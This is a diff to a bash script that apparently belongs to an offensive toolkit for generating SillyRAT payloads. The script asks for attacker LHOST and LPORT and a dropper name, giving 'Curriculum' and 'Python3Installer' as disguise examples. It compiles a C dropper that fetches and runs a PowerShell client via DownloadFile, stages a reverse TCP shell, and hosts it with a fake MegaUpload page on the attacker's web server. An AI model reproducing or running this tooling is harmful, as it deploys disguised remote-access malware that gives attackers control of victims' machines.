@@ -13177,6 +13177,7 @@ if ! [ -e "$IPATH/bin/SillyRAT/venomconf" ]; then
    cd $IPATH
 fi
 
+
 # -------------------------------------------------------
 
 
@@ -13185,20 +13186,24 @@ lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --wid
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 Drop=$(zenity --title="☠ Enter DROPPER FILENAME ☠" --text "example: Curriculum\nWarning: Allways Start FileNames With 'Capital Letters'" --entry --width 300) > /dev/null 2>&1
 rpath=$(zenity --title="☠ Enter Files Upload Path (target dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%\nexample: %userprofile%\\\\\\\Desktop\n\n(*) Recomended Path For Upload our files.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1
-if [ -z "$Drop" ]; then Drop="Python3Installer";fi
-SOSP=$(zenity --list --title "☠ Target Operative System sellection ☠" --text "\nCreate a standalone executable (Windows) or Pure Python dropper ?" --radiolist --column "Pick" --column "Option" TRUE "$Drop.exe (default)" FALSE "$Drop.py (multi-platforms)") > /dev/null 2>&1
+SOSP=$(zenity --list --title "☠ Target Operative System sellection ☠" --text "Remark: Sellecting 'Linux' or 'Mac' will not create dropper.exe" --radiolist --column "Pick" --column "Option" TRUE "Windows" FALSE "Linux" FALSE "Mac") > /dev/null 2>&1
 
 ## Setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="666";fi
 if [ -z "$rpath" ]; then rpath="%tmp%";fi
-if [ -z "$SOSP" ]; then SOSP="default)";fi
-if [ "$SOSP" = "$Drop.exe (default)" ] || [ "$SOSP" = "(default)" ]; then
-   if [ -z "$Drop" ]; then Drop="Python3Installer";fi
-   dropextension="exe";targetos="(Windows)"
+if [ -z "$SOSP" ]; then SOSP="windows";fi
+if [ -z "$Drop" ]; then Drop="Python3Installer";fi
+if [ "$SOSP" = "Windows" ]; then
+   targetos="Windows"
+   dropextension="exe"
+   uploadpath="$rpath => (remote)"
+   dropperpath="$IPATH/output/$Drop.$dropextension"
 else
-   if [ -z "$Drop" ]; then Drop="Python3Installer";fi
-   dropextension="py";targetos="(Linux|Mac|Windows)"
+   targetos="$SOSP"
+   dropextension="py"
+   uploadpath="NULL"
+   dropperpath="NULL"
 fi
 
 
@@ -13208,17 +13213,17 @@ echo ${BlueF}"---"
 cat << !
     LPORT    : $lport
     LHOST    : $lhost
-    TARGETOS : $targetos
+    TARGETOS : ($targetos distro)
     LOLBin   : Powershell (DownloadFile)
-    DROPPER  : $IPATH/output/$Drop.$dropextension
+    DROPPER  : $dropperpath
     AGENT    : $IPATH/output/$Drop.py
-    UPLOADTO : $rpath => (remote)
+    UPLOADTO : $uploadpath
 !
 echo "---"
 
 
 cd $IPATH/output
-if [ "$SOSP" = "$Drop.exe (default)" ]; then
+if [ "$SOSP" = "Windows" ]; then
    ## BUILD DROPPER (to download/execute Client.ps1).
    echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 2
    cp $IPATH/templates/sillyme.c $IPATH/output/dropper.c
@@ -13249,7 +13254,7 @@ mv MegaUpload.html $ApAcHe/MegaUpload.html > /dev/nul 2>&1
 
 cd $IPATH/output
 echo "${BlueF}[☠]${white} Porting required files to apache2 webroot."${Reset};sleep 2
-if [ "$SOSP" = "$Drop.exe (default)" ]; then
+if [ "$SOSP" = "Windows" ]; then
    zip $Drop.zip $Drop.exe > /dev/nul 2>&1 # ZIP dropper.exe
    cp $IPATH/output/$Drop.py $ApAcHe/$Drop.py > /dev/nul 2>&1 # rev tcp Client shell
    mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped
